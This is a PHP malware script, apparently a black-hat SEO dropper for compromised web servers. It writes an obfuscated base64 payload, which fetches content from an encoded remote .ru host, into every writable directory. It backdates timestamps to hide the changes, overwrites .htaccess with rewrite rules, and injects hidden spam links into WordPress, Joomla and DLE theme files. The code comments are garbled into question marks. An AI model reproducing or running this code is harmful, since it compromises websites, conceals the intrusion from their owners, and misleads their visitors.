<?php
ignore_user_abort(true);
set_time_limit(0);
error_reporting(0);
$dirs = array();
function Check($dir, $dirs)
        {
        $ls = scandir($dir);
        $ls = array_diff($ls, array(
                '.',
                '..'
        ));
        foreach($ls as $line)
                {
                $line = $dir . '/' . $line;
                if (is_writable($line) && is_dir($line) && !is_link($line))
                        {
                        $dirs[] = $line;
                        if ($line != $dir) check($line, $dirs);
                        }
                }
 
        return $dirs;
        }
 
function CheckUrl($adress, $checkStr)
        {
        if ($curl = curl_init())
                {
                curl_setopt($curl, CURLOPT_URL, 'http://' . $adress);
                curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
                $out = curl_exec($curl);
                curl_close($curl);
                if (strpos($out, $checkStr) != false)
                        {
                        return 'true';
                        }
                  else return 'false0';
                }
          else return 'false1';
        }
 
function EditHtaccess($fileData)
        {
        $htaccessPath = $_SERVER['DOCUMENT_ROOT'] . '/.htaccess';
        if (file_exists($htaccessPath))
                {
                chmod($htaccessPath, 0777);
                if (is_writable($htaccessPath))
                        {
                        $htaccessData = file_get_contents($htaccessPath);
                        $htaccessTime = filemtime($htaccessPath);
                        $appendData = $fileData . "\n\n" . $htaccessData;
                        $ff = fopen($htaccessPath, 'w');
                        fwrite($ff, $appendData);
                        fclose($ff);
                        touch($htaccessPath, $htaccessTime);
                        chmod($htaccessPath, 0444);
                        }
                }
                else
                        {
                        $htaccessTime = filemtime($_SERVER['DOCUMENT_ROOT']);
                        $appendData = $fileData;
                        $ff = fopen($htaccessPath, 'w');
                        fwrite($ff, $appendData);
                        fclose($ff);
                        touch($htaccessPath, $htaccessTime);
                        chmod($htaccessPath, 0444);
                        }
        }
 
function ProcessDir($dir, $fileName)
        {
        $fileData='PD9waHAgJEdMT0JBTFNbJ19mZ2hmaF8nXT1BcnJheShiYXNlNjRfZGVjb2RlKCcnIC4nYScgLidHVmhaR1Z5JyksYmFzZTY0X2RlY29kZSgnJyAuJ2MnIC4nM1J5Y0c5eicpLGJhc2U2NF9kZWNvZGUoJ2MnIC4nM1YnIC4naWMzJyAuJ1J5JyksYmFzZTY0X2RlY29kZSgnYzNSJyAuJ3ljJyAuJ0c5eicpLGJhc2U2NF9kZWNvZGUoJ2MzUnljJyAuJ0cnIC4nOXonKSxiYXNlNjRfZGVjb2RlKCdjM1J5WDNKJyAuJ2wnIC4nY0d4JyAuJ2hZJyAuJzJVPScpLGJhc2U2NF9kZWNvZGUoJ2MzJyAuJ1J5Y0c5eicpLGJhc2U2NF9kZWNvZGUoJ2RYSnNaVycgLic1aicgLidiJyAuJzJSbCcpLGJhc2U2NF9kZWNvZGUoJ2MzVmknIC4nYzMnIC4nUnknKSxiYXNlNjRfZGVjb2RlKCdjJyAuJzNSeScgLidjJyAuJ0c5JyAuJ3onKSxiYXNlNjRfZGVjb2RlKCdjMycgLidSeWMnIC4nRzl6JyksYmFzZTY0X2RlY29kZSgnYzNSeVgnIC4nM0psY0d4aFkyVT0nKSxiYXNlNjRfZGVjb2RlKCdjM1J5Y0cnIC4nOXonKSxiYXNlNjRfZGVjb2RlKCdjM1J5JyAuJ1gzSmxjR3hoWTJVPScpLGJhc2U2NF9kZWNvZGUoJ2MzUnknIC4nYycgLidHOScgLid6JyksYmFzZTY0X2RlY29kZSgnYzNSeVgzJyAuJ0psY0d4aFkyVT0nKSxiYXNlNjRfZGVjb2RlKCdjMycgLidSeWNHOXonKSxiYXNlNjRfZGVjb2RlKCcnIC4nYzNSeScgLidYM0psY0d4aCcgLidZJyAuJzJVPScpLGJhc2U2NF9kZWNvZGUoJ2MzUicgLid5Y0c5eicpLGJhc2U2NF9kZWNvZGUoJ2MnIC4nM1J5WCcgLiczSicgLidsY0d4aFkyVScgLic9JyksYmFzZTY0X2RlY29kZSgnYzMnIC4nUnljRzl6JyksYmFzZTY0X2RlY29kZSgnYycgLiczUicgLid5WDNKJyAuJ2xjR3hoWTJVJyAuJz0nKSxiYXNlNjRfZGVjb2RlKCdZM1YnIC4neWJGOXBibWwnIC4nMCcpLGJhc2U2NF9kZWNvZGUoJ1kzVnliRjl6WlhSdmNIUScgLic9JyksYmFzZTY0X2RlY29kZSgnWScgLiczVnliRjl6WlhSdmNIUT0nKSxiYXNlNjRfZGVjb2RlKCdZM1Z5YkYnIC4nOXpaJyAuJ1hSdmNIUT0nKSxiYXNlNjRfZGVjb2RlKCdZMycgLidWJyAuJ3knIC4nYkY5bCcgLidlR1ZqJyksYmFzZTY0X2RlY29kZSgnWTMnIC4nVnliRjlqYkcnIC4nOXpaUScgLic9PScpLGJhc2U2NF9kZWNvZGUoJ1puTicgLid2WScgLicydCcgLid2JyAuJ2NHVnUnKSxiYXNlNjRfZGVjb2RlKCdabmR5YVgnIC4nUmwnKSxiYXNlNjRfZGVjb2RlKCdabVZ2Wmc9PScpLGJhc2U2NF9kZWNvZGUoJ1ptZGxkSE0nIC4nPScpLGJhc2U2NF9kZWNvZGUoJ1onIC4nWCcgLidod2InIC4nRzlrJyAuJ1onIC4nUT09JyksYmFzZTY0X2RlY29kZSgnJyAuJ1ptTnNiM05sJykpOyA/Pjw/cGhwIGZ1bmN0aW9uIGZnaGZoKCRpKXskYT1BcnJheSgnUTI5dWRHVnVkQzFVZVhCbE9pQjBaWGgwTDJoMGJXdzdJR05vWVhKelpYUTlWVlJHTFRnPScsJ2NBPT0nLCdjMkZrWVhOMVpIVmhjMlJwYUdGcGMyUmhaQzV5ZFE9PScsJ0wyTmhZMmhsTHc9PScsJ1NGUlVVRjlJVDFOVScsJ0wyUnNMUT09JywnU0ZSVVVGOURURWxGVGxSZlNWQT0nLCdTRlJVVUY5RFRFbEZUbFJmU1ZBPScsJ1NGUlVVRjlZWDBaUFVsZEJVa1JGUkY5R1QxST0nLCdTRlJVVUY5WVgwWlBVbGRCVWtSRlJGOUdUMUk9JywnVWtWTlQxUkZYMEZFUkZJPScsJ1NGUlVVRjlWVTBWU1gwRkhSVTVVJywnU1ZBNklBPT0nLCdTRlJVVUY5VlUwVlNYMEZIUlU1VScsJ1NGUlVVRjlWVTBWU1gwRkhSVTVVJywnU1ZBNklBPT0nLCdMbXB6JywnTG1weicsJ0xtcHonLCcnLCcnLCdjSEp2YTJ3dCcsJ0xuQm9jRDkwWkhNdGNUMD0nLCdjSEp2YTJ3dCcsJ2NISnZhMnc9JywnJywnTG1OemN3PT0nLCdMbU56Y3c9PScsJ0xtTnpjdz09JywnJywnJywnTG1kcFpnPT0nLCdMbWRwWmc9PScsJ0xtZHBaZz09JywnJywnJywnTG1oMGJRPT0nLCdMbWgwYlE9PScsJ0xtaDBiUT09JywnJywnJywnTG1wd1p3PT0nLCdMbXB3Wnc9PScsJ0xtcHdadz09JywnJywnJywnTG1samJ3PT0nLCdMbWxqYnc9PScsJ0xtbGpidz09JywnJywnJywnTG5CdVp3PT0nLCdMbkJ1Wnc9PScsJ0xuQnVadz09JywnJywnJywnU0ZSVVVGOVNSVVpGVWtWUycsJ0xuQm9jRDlwY0QwPScsJ0puSmxaajA9JywnJywnJywnYUhSMGNEb3ZMdz09JywnU0ZSVVVGOVZVMFZTWDBGSFJVNVUnLCdSMFZVSUE9PScsJ0lFaFVWRkF2TVM0eERRbz0nLCdTRzl6ZERvZycsJ0RRbz0nLCdWWE5sY2kxQloyVnVkRG9nJywnU0ZSVVVGOVZVMFZTWDBGSFJVNVUnLCdEUW89JywnUTI5dWJtVmpkR2x2YmpvZ1EyeHZjMlVOQ2cwSycsJ0RRb05DZz09Jyk7cmV0dXJuIGJhc2U2NF9kZWNvZGUoJGFbJGldKTt9ID8+PD9waHAgJEdMT0JBTFNbJ19mZ2hmaF8nXVswXShmZ2hmaCgwKSk7JHNhZHF3el8wPWZnaGZoKDEpOyRzYWRxd3pfMT1mZ2hmaCgyKTskc2FkcXd6XzI9ZmdoZmgoMyk7JHNhZHF3el8zPSRfU0VSVkVSW2ZnaGZoKDQpXSAuZmdoZmgoNSk7ZnVuY3Rpb24gYmRmYmRmX18wKCl7aWYoIWVtcHR5KCRfU0VSVkVSW2ZnaGZoKDYpXSkpeyRzYWRxd3pfND0kX1NFUlZFUltmZ2hmaCg3KV07fWVsc2VpZighZW1wdHkoJF9TRVJWRVJbZmdoZmgoOCldKSl7JHNhZHF3el80PSRfU0VSVkVSW2ZnaGZoKDkpXTt9ZWxzZXskc2FkcXd6XzQ9JF9TRVJWRVJbZmdoZmgoMTApXTt9cmV0dXJuICRzYWRxd3pfNDt9aWYoaXNzZXQoJF9HRVRbJHNhZHF3el8wXSkpeyRzYWRxd3pfNT1iZGZiZGZfXzAoKTtpZigkR0xPQkFMU1snX2ZnaGZoXyddWzFdKCRfU0VSVkVSW2ZnaGZoKDExKV0sZmdoZmgoMTIpKSE9PUZBTFNFKSRzYWRxd3pfNT0kR0xPQkFMU1snX2ZnaGZoXyddWzJdKCRfU0VSVkVSW2ZnaGZoKDEzKV0sJEdMT0JBTFNbJ19mZ2hmaF8nXVszXSgkX1NFUlZFUltmZ2hmaCgxNCldLGZnaGZoKDE1KSkrNCk7JHNhZHF3el82PSRfR0VUWyRzYWRxd3pfMF07aWYoJEdMT0JBTFNbJ19mZ2hmaF8nXVs0XSgkc2FkcXd6XzYsZmdoZmgoMTYpKSE9PSBmYWxzZSl7JHNhZHF3el83PWZnaGZoKDE3KTskc2FkcXd6XzY9JEdMT0JBTFNbJ19mZ2hmaF8nXVs1XShmZ2hmaCgxOCksZmdoZmgoMTkpLCRzYWRxd3pfNik7JHNhZHF3el8zPWZnaGZoKDIwKTt9ZWxzZSBpZigkR0xPQkFMU1snX2ZnaGZoXyddWzZdKCRzYWRxd3pfNixmZ2hmaCgyMSkpIT09IGZhbHNlKXskc2FkcXd6Xzc9ZmdoZmgoMjIpIC4kR0xPQkFMU1snX2ZnaGZoXyddWzddKCRHTE9CQUxTWydfZmdoZmhfJ11bOF0oJHNhZHF3el82LCRHTE9CQUxTWydfZmdoZmhfJ11bOV0oJHNhZHF3el82LGZnaGZoKDIzKSkrNikpOyRzYWRxd3pfNj1mZ2hmaCgyNCk7JHNhZHF3el8zPWZnaGZoKDI1KTt9ZWxzZSBpZigkR0xPQkFMU1snX2ZnaGZoXyddWzEwXSgkc2FkcXd6XzYsZmdoZmgoMjYpKSE9PSBmYWxzZSl7JHNhZHF3el83PWZnaGZoKDI3KTskc2FkcXd6XzY9JEdMT0JBTFNbJ19mZ2hmaF8nXVsxMV0oZmdoZmgoMjgpLGZnaGZoKDI5KSwkc2FkcXd6XzYpOyRzYWRxd3pfMz1mZ2hmaCgzMCk7fWVsc2UgaWYoJEdMT0JBTFNbJ19mZ2hmaF8nXVsxMl0oJHNhZHF3el82LGZnaGZoKDMxKSkhPT0gZmFsc2UpeyRzYWRxd3pfNz1mZ2hmaCgzMik7JHNhZHF3el82PSRHTE9CQUxTWydfZmdoZmhfJ11bMTNdKGZnaGZoKDMzKSxmZ2hmaCgzNCksJHNhZHF3el82KTskc2FkcXd6XzM9ZmdoZmgoMzUpO31lbHNlIGlmKCRHTE9CQUxTWydfZmdoZmhfJ11bMTRdKCRzYWRxd3pfNixmZ2hmaCgzNikpIT09IGZhbHNlKXskc2FkcXd6Xzc9ZmdoZmgoMzcpOyRzYWRxd3pfNj0kR0xPQkFMU1snX2ZnaGZoXyddWzE1XShmZ2hmaCgzOCksZmdoZmgoMzkpLCRzYWRxd3pfNik7JHNhZHF3el8zPWZnaGZoKDQwKTt9ZWxzZSBpZigkR0xPQkFMU1snX2ZnaGZoXyddWzE2XSgkc2FkcXd6XzYsZmdoZmgoNDEpKSE9PSBmYWxzZSl7JHNhZHF3el83PWZnaGZoKDQyKTskc2FkcXd6XzY9JEdMT0JBTFNbJ19mZ2hmaF8nXVsxN10oZmdoZmgoNDMpLGZnaGZoKDQ0KSwkc2FkcXd6XzYpOyRzYWRxd3pfMz1mZ2hmaCg0NSk7fWVsc2UgaWYoJEdMT0JBTFNbJ19mZ2hmaF8nXVsxOF0oJHNhZHF3el82LGZnaGZoKDQ2KSkhPT0gZmFsc2UpeyRzYWRxd3pfNz1mZ2hmaCg0Nyk7JHNhZHF3el82PSRHTE9CQUxTWydfZmdoZmhfJ11bMTldKGZnaGZoKDQ4KSxmZ2hmaCg0OSksJHNhZHF3el82KTskc2FkcXd6XzM9ZmdoZmgoNTApO31lbHNlIGlmKCRHTE9CQUxTWydfZmdoZmhfJ11bMjBdKCRzYWRxd3pfNixmZ2hmaCg1MSkpIT09IGZhbHNlKXskc2FkcXd6Xzc9ZmdoZmgoNTIpOyRzYWRxd3pfNj0kR0xPQkFMU1snX2ZnaGZoXyddWzIxXShmZ2hmaCg1MyksZmdoZmgoNTQpLCRzYWRxd3pfNik7JHNhZHF3el8zPWZnaGZoKDU1KTt9ZWxzZXskc2FkcXd6Xzg9JF9TRVJWRVJbZmdoZmgoNTYpXTskc2FkcXd6Xzc9ZmdoZmgoNTcpIC4kc2FkcXd6XzUgLmZnaGZoKDU4KSAuJHNhZHF3el85O30kc2FkcXd6XzEwPWZnaGZoKDU5KTskc2FkcXd6XzExPWZnaGZoKDYwKTtpZigkc2FkcXd6XzEyPSRHTE9CQUxTWydfZmdoZmhfJ11bMjJdKCkpeyRHTE9CQUxTWydfZmdoZmhfJ11bMjNdKCRzYWRxd3pfMTIsQ1VSTE9QVF9VUkwsZmdoZmgoNjEpIC4kc2FkcXd6XzEgLiRzYWRxd3pfMiAuJHNhZHF3el8zIC4kc2FkcXd6XzYgLiRzYWRxd3pfNyk7JEdMT0JBTFNbJ19mZ2hmaF8nXVsyNF0oJHNhZHF3el8xMixDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLHRydWUpOyRHTE9CQUxTWydfZmdoZmhfJ11bMjVdKCRzYWRxd3pfMTIsQ1VSTE9QVF9VU0VSQUdFTlQsJF9TRVJWRVJbZmdoZmgoNjIpXSk7JHNhZHF3el8xMD0kR0xPQkFMU1snX2ZnaGZoXyddWzI2XSgkc2FkcXd6XzEyKTskR0xPQkFMU1snX2ZnaGZoXyddWzI3XSgkc2FkcXd6XzEyKTt9ZWxzZXskc2FkcXd6XzEzPSRHTE9CQUxTWydfZmdoZmhfJ11bMjhdKCRzYWRxd3pfMSw4MCwkc2FkcXd6XzE0LCRzYWRxd3pfMTUsMzApO2lmKCRzYWRxd3pfMTMpeyRzYWRxd3pfMTA9ZmdoZmgoNjMpIC4kc2FkcXd6XzIgLiRzYWRxd3pfMyAuJHNhZHF3el82IC4kc2FkcXd6XzcgLmZnaGZoKDY0KTskc2FkcXd6XzEwIC49IGZnaGZoKDY1KSAuJHNhZHF3el8xIC5mZ2hmaCg2Nik7JHNhZHF3el8xMCAuPSBmZ2hmaCg2NykgLiRfU0VSVkVSW2ZnaGZoKDY4KV0gLmZnaGZoKDY5KTskc2FkcXd6XzEwIC49IGZnaGZoKDcwKTskR0xPQkFMU1snX2ZnaGZoXyddWzI5XSgkc2FkcXd6XzEzLCRzYWRxd3pfMTApO3doaWxlKCEkR0xPQkFMU1snX2ZnaGZoXyddWzMwXSgkc2FkcXd6XzEzKSl7JHNhZHF3el8xMS49JEdMT0JBTFNbJ19mZ2hmaF8nXVszMV0oJHNhZHF3el8xMywxMjgpO30kc2FkcXd6XzE2PSRHTE9CQUxTWydfZmdoZmhfJ11bMzJdKGZnaGZoKDcxKSwkc2FkcXd6XzExLDIpOyRzYWRxd3pfMTA9JHNhZHF3el8xNlsxXTskR0xPQkFMU1snX2ZnaGZoXyddWzMzXSgkc2FkcXd6XzEzKTt9fWVjaG8gJHNhZHF3el8xMDtleGl0O30gPz4=';
        $filePath = $dir . '/' . $fileName;
        $fileTime = filemtime($dir);
        if ($fp = fopen($filePath, 'w'))
                {
                fwrite($fp, base64_decode($fileData));
                fclose($fp);
                touch($filePath, $fileTime);
                touch($dir, $fileTime);
                return $filePath;
                }
          else return "";
        }
 /**
* ????? ????? ?? ????? */
function search_dir( $searchDirName, $searchDirs = false ){
    // ????????? ??????? ????? 
    if( $searchDirs ) $openDir = $_SERVER['DOCUMENT_ROOT']."/".$searchDirName;
	else $openDir = $_SERVER['DOCUMENT_ROOT'];
    
    $dir = opendir( $openDir  );  
    while (($item = readdir($dir)) !== false){ // ?????????? ???? ???? ????????
        if($item != "." && $item != ".."){ 
            if(is_dir($openDir."/".$item)){ // ???? ????? ????????? ???
                // ???? ??? ????? ??????, ?? ?????? ???? ?? ????
                if( $searchDirs ){
	                $dirs_array[] = $item;
                }
                elseif( $item == $searchDirName ) return $searchDirName;            } 
        } 
    }
    // ????????? ?????
    closedir($dir);
    return $dirs_array;
}

$dirs = check(dirname($_SERVER['DOCUMENT_ROOT'] . '/RND') , $dirs);
//$dirs = check(dirname($_SERVER['DOCUMENT_ROOT'] . '') , $dirs);
template_write( "test");
$mx = array();


// ?????? ? ????? ????????
function template_write( $link ){
	$search_tag = "#(<body[^>]*>)#";
	
	$insert_code = '<div style="position:absolute;left:-2000px">'."<a href='".$_SERVER['HTTP_HOST'].$link."dl-index'>".$_SERVER['HTTP_HOST']."</a>"."<a href='".$_SERVER['HTTP_HOST'].$link."dl-map1'>sitemap</a></div>";//???????? ????????
	
	if( search_dir( "templates" ) ){
		//??????  joomla ??? dle
		$main_dir = "templates";
		$main_file[] = "main.tpl";
		$main_file[] = "index.php";
		$folders = search_dir( "templates", true );
		
	} elseif( search_dir( "wp-content" ) ){
		//  ?????? ? wp
		$main_dir = "wp-content/themes";
		$main_file[] = "header.php";
		$folders =  search_dir( "wp-content/themes", true );
	}
	foreach( $folders as $theme_name ){
		foreach( $main_file as $main_file_one ){
		
		$text = @file_get_contents( $_SERVER['DOCUMENT_ROOT']."/".$main_dir."/".$theme_name."/".$main_file_one );
		
		$file_content = preg_replace( $search_tag, "$1".$insert_code,$text,1);
		
		$fopen = @fopen( $_SERVER['DOCUMENT_ROOT']."/".$main_dir."/".$theme_name."/".$main_file_one, "w+" );
		fwrite($fopen, $file_content);
		fclose($fopen);
		
		}
	}	
} 
 
foreach($dirs as $ln)
        {
        $mx[$ln] = substr_count($ln, "/");
        }
 
arsort($mx);
foreach($mx as $dir => $depth)
        {
        $prDir = processDir($dir, 'forumdisplay.php');
        if (strlen($prDir) > 0)
                {
                $prHtach=EditHtaccess('RewriteEngine On
RewriteRule ^dl-(.*)$ '.$dir.'/forumdisplay.php?p=$1 [L]');


                if (CheckUrl($_SERVER['HTTP_HOST'].'/'.'dl-map1' , 'http://www.youtube.com/embed/kSdgHtNuslY?rel=0&autoplay=1') == 'true')
                        {
                                echo $_SERVER['HTTP_HOST'].'/'.'forumdisplay.php';
								
                                //template_write( "/" );
                                
                                exit();
                        }
                }
                
        }
		
		echo '!!!error!!!';
        exit();
?>